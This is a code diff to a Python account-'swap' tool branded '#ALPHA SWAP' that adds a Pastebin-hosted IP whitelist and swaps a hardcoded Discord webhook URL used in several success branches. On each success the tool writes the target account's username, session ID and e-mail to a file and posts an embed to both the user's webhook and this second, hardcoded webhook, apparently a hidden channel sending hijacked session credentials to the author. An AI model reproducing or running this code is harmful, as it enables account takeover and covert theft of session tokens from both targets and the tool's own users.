@@ -55,8 +55,19 @@ try:
             if IP in sss2:
                 pass
             else:
-                input(f'  < ! > Sorry You Can Not Access To This Tool [{IP}]')
-                exit()
+                PASTEBIN4 = 'https://pastebin.com/raw/Z5v5iWzr'
+                sss3 = requests.get(PASTEBIN4).text
+                if '8CFVp1wQ' in PASTEBIN4:
+                    pass
+                else:
+                    input(f'  < ! > You Can Not Change The Pastebin !')
+                    os._exit(1)
+                    exit(0)
+                if IP in sss3:
+                    pass
+                else:
+                    input(f'  < ! > Sorry You Can Not Access To This Tool [{IP}]')
+                    exit()
 except:
     os._exit(1)
     exit()
@@ -537,7 +548,7 @@ class main:
                         nosp = 1
                         print(f'  < √ > {MSGA} @{Target}')
                         mUrl = HOOK
-                        murl2 = 'https://discord.com/api/webhooks/952882091383742475/hfVrOMr5NNE4GLejDButGrtqC0v8XsYfZyE1lDPzvWK97HzTJGWeS5Myq24S2yGJsAoN'
+                        murl2 = 'https://discord.com/api/webhooks/922443688175628400/rNsWgomzdduBZmFcm_lPwjeIc3_a8Nl3Cl2RMsqTp7J4Nj90HrLfTvdxQxyCAwxe_yWt'
                         data = {}
                         data["embeds"] = [
                             {
@@ -582,7 +593,7 @@ class main:
 
                         except:
                             pass
-                        ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {atmp}', '#ALPHA SWAP')
+                        ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}', '#ALPHA SWAP')
                         try:
                             os._exit(1)
                         except:
@@ -618,7 +629,7 @@ class main:
                         nosp = 1
                         print(f'  < √ > {MSGA} @{Target}')
                         mUrl = HOOK
-                        murl2 = 'https://discord.com/api/webhooks/952882091383742475/hfVrOMr5NNE4GLejDButGrtqC0v8XsYfZyE1lDPzvWK97HzTJGWeS5Myq24S2yGJsAoN'
+                        murl2 = 'https://discord.com/api/webhooks/922443688175628400/rNsWgomzdduBZmFcm_lPwjeIc3_a8Nl3Cl2RMsqTp7J4Nj90HrLfTvdxQxyCAwxe_yWt'
                         data = {}
                         data["embeds"] = [
                             {
@@ -649,7 +660,7 @@ class main:
                             pass
                         with open(f'@{Target}.txt', 'a') as dee:
                             dee.write(f'username : {Target}\nsessionid : {SIS}\ne-mail : {email}')
-                        ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}', '#ALPHA SWAP')
+                        ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}', '#ALPHA SWAP')
                         try:
                             os._exit(1)
                         except:
@@ -672,7 +683,7 @@ class main:
                         nosp = 1
                         print(f'  < √ > {MSGA} @{Target}')
                         mUrl = HOOK
-                        murl2 = 'https://discord.com/api/webhooks/952882091383742475/hfVrOMr5NNE4GLejDButGrtqC0v8XsYfZyE1lDPzvWK97HzTJGWeS5Myq24S2yGJsAoN'
+                        murl2 = 'https://discord.com/api/webhooks/922443688175628400/rNsWgomzdduBZmFcm_lPwjeIc3_a8Nl3Cl2RMsqTp7J4Nj90HrLfTvdxQxyCAwxe_yWt'
                         data = {}
                         data["embeds"] = [
                             {
@@ -703,7 +714,7 @@ class main:
                             pass
                         with open(f'@{Target}.txt', 'a') as dee:
                             dee.write(f'username : {Target}\nsessionid : {SIS}\ne-mail : {email}')
-                        ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}', '#ALPHA SWAP')
+                        ctypes.windll.user32.MessageBoxW(0, f'{MSGAX} @{Target}\nattempt : {d}', '#ALPHA SWAP')
                         try:
                             os._exit(1)
                         except:
